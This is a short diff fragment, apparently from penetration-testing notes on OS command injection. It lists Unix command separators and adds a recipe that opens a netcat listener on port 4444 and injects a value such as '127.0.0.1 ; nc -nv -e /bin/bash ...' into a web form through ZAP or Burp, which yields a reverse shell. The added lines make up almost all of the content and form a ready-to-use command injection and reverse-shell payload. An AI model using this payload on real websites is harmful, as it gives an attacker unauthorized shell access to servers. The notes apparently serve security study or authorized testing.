@@ -18,3 +18,21 @@ Unix only:
 \n or 0x0a
 `
 $
+
+In terminal > nc -nvlp 4444
+In website/zap/burp > 127.0.0.1 ; nc -nv -e /bin/bash 127.0.0.1 4444
+You are now free to navigate through OS
+
+
+
+
+
+
+
+
+
+
+
+
+
+
